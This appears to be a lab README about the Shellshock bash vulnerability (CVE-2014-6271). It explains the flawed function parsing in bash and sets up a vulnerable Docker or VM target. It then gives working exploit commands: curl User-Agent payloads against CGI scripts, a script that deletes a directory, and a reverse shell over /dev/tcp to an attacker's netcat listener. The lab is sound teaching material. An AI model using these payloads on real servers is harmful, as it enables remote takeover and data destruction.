# Shellshock (CVE-2014-6271)

## How it works

Before shellshock, bash allowed function definitions for their environment variables. For example

```bash
set X=() { echo 'Inside func' }
echo $X # 'Inside func'
```

However, the way it handled processing of function definition is incredibly unsecure

```c
/* Initialize the shell variables from the current environment.
   If PRIVMODE is nonzero, don't import functions from ENV or
   parse $SHELLOPTS. */
void
initialize_shell_variables (env, privmode)
     char **env;
     int privmode;
{
  [...]
  for (string_index = 0; string = env[string_index++]; )
    {

      [...]
      /* If exported function, define it now.  Don't import functions from
     the environment in privileged mode. */
      if (privmode == 0 && read_but_dont_execute == 0 && STREQN ("() {", string, 4))
      {
        [...]
        parse_and_execute (temp_string, name, SEVAL_NONINT|SEVAL_NOHIST);
        [...]
      }
}
```

While looping through environment variables being set, the only check for a function definition is a simple string comparison of the first 4 characters in `STREQN("() {", string, 4)`. If it matches, the string will be passed to `parse_and_execute()` where it is run as a regular bash command.

This would work in a trusted setting when the code was written but not so much if bad actors could set variable values. To exploit this, attackers will need to know software that uses bash to set environment variables during runtime, with user input.

## Exploits

A simple exploit is running 

```bash
env X='() { :; }; echo "pwned"' bash -c :
```

This sets X to be `() { :; }; echo "pwned"` then starts bash. When bash starts it will handle all environment variables including `X` and should echo `pwned`. Then executes `:` which is just a `NOP` instruction.

Another such exploit is with web servers that use CGI, where it copies of bunch of header information into environment variables for CGI scripts to use, such as `HTTP_USER_AGENT`, `HTTP_ACCEPT_ENCODING` and `REMOTE_PORT`.

The attacker will know that their `User-Agent` header will be used in bash and it is a mutable value in their HTTP request. If they know the server uses CGI, they have a possible target.

## Docker Setup

For basic bitches, create a docker image with the built in Dockerfile, it'll setup everything for you. Ensure to change the demo examples to use port 8080 or whichever was exposed for the container. Ensure you are in the `shellshock` directory.

```bash
    docker build -t vuln-apache2-cgi .
    docker run -d -p 8080:80 --name shellshock-demo vuln-apache2-cgi
```

You should be able to access `http://localhost:8080/cgi-bin/info.cgi` and it will return your browser's user agent.

Now if you run `python attack.py` then access `http://localhost:8080/cgi-bin/info.cgi`, the `super-impt-stuff` directory and all its contents will be deleted and will return `Taken Over` to the client.

## VM Setup

A modern Linux distribution will be used and replacing the bash executable that comes with it with the unpatched one instead of installing an old distro release because

- Many distros have been quietly patched and it's unclear if it will have an unpatched bash executable
- Trying out some old Ubuntu versions resulted in network issues with Hyper-V which I'm too lazy to sort out

1. Install Ubuntu VM (Ubuntu Server 22.04.3 was used for writing) or use WSL on Windows and when finished

    ```bash
        # Install necessary packages
        sudo apt update && sudo apt upgrade -y
        sudo apt install gcc make
    ```

2. Setup vulnerable bash version (4.3.0 in this case)

    ```bash
        # Start at your home directory (eg. /home/benjababe/)
        cd ~

        # Download and extract bash source
        wget https://ftp.gnu.org/gnu/bash/bash-4.3.tar.gz
        tar -xf bash-4.3.tar.gz

        # Build the vulnerable bash
        cd bash-4.3
        ./configure --bindir=/home/${USER}/bash-4.3
        make

        # Ensure it's properly compiled
        ./bash --version

        # Replace the default bash with the vulnerable one
        sudo mv /bin/bash /bin/bash_bak
        sudo cp ./bash /bin/bash

        # Check to see the global bash is the vulnerable one
        bash --version
    ```

3. Setup Apache following instructions [here](https://github.com/jeholliday/shellshock#apache-cgi).
4. Copy the files in `cgi-bin` of the repository to `/usr/lib/cgi-bin/` of the Linux instance.
5. If Apache server is running properly (Retrieve the IP with `ip a` and type it onto your host, it should show the default Apache2 page), setup the CGI files.

    ```bash
    cd /usr/lib/cgi-bin/
    sudo chmod +x *
    sudo ./setup.sh
    ```

6. Now if you run `python attack.py` then access `${VM_IP}/cgi-bin/info.cgi`, the `super-impt-stuff` directory and all its contents will be deleted.


## Reverse Shell

### Prerequisites

- A seperate instance of Linux (the attacker) apart from the vulnerable VM, Windows does not support bash

### Steps

1. Ensure the Apache2 CGI vulnerability is working by running on the attacker

    ```bash
    # vm: curl -A "() { :; }; echo Content-Type: text/plain; echo; echo Vulnerable;" 172.27.12.218/cgi-bin/test.cgi
    # docker: curl -A "() { :; }; echo Content-Type: text/plain; echo; echo Vulnerable;" http://localhost:8080/cgi-bin/test.cgi

    curl -A "() { :; }; echo Content-Type: text/plain; echo; echo Vulnerable;" ${VM_IP}/cgi-bin/test.cgi
    ```

2. On a separate terminal instance of the attacker, start listening to one of its available ports using `netcat`

    ```bash
    nc -lvp 11111
    ```

3. To get the reverse shell, run the following on the attacker

    ```bash
    # vm: curl -A "() { :; }; /bin/bash -i >& /dev/tcp/172.27.10.188/11111 0>&1" 172.27.12.218/cgi-bin/test.cgi
    # docker: curl -A "() { :; }; /bin/bash -i >& /dev/tcp/192.168.1.171/11111 0>&1" http://localhost:8080/cgi-bin/test.cgi

    curl -A "() { :; }; /bin/bash -i >& /dev/tcp/${ATTACKER_IP}/${NETCAT_PORT} 0>&1" ${VM_IP}/cgi-bin/test.cgi
    ```

4. The terminal instance of `netcat` should now have shell access of the vulnerable system, with user control of whomever is in charge of apache (`www-data` by default, check with `whoami`).


## In-depth Reading

- https://security.stackexchange.com/questions/68168/is-there-a-short-command-to-test-if-my-server-is-secure-against-the-shellshock-b

- https://github.com/jeholliday/shellshocka